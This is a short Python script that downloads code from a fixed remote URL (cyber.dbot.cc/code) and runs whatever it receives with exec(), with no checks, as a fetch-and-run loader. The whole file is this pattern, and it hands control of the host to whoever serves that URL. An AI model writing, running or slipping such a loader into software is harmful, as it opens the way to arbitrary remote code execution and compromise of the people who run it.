import requests
import subprocess
import io

# Define the URL where your code is hosted
remote_code_url = "https://cyber.dbot.cc/code"

# Fetch the code from the URL
response = requests.get(remote_code_url)

if response.status_code == 200:
    # Read the fetched code
    remote_code = response.text

    # Execute the fetched code as a Python script
    try:
        exec(remote_code)
    except Exception as e:
        print(f"An error occurred while executing the remote code: {e}")
else:
    print(f"Failed to fetch code from the URL: {remote_code_url}")
